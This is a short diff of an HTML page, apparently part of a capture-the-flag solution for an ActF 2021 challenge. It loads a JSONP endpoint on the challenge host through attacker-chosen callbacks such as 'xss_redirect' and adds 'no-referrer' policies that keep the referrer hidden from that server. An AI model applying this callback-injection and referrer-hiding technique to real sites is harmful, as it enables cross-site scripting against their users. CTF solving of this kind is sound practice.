@@ -18,7 +18,8 @@ layout: xss
     }
     var script = document.createElement('script');
     script.src = 'https://jason.2021.chall.actf.co/languages?callback=processWeatherCallback';
+    script.referrerPolicy = "no-referrer";
     document.body.appendChild(script);
 </script>
 
-<script src="https://jason.2021.chall.actf.co/languages?callback=xss_redirect"></script>
+<script src="https://jason.2021.chall.actf.co/languages?callback=xss_redirect" referrerpolicy="no-referrer"></script>
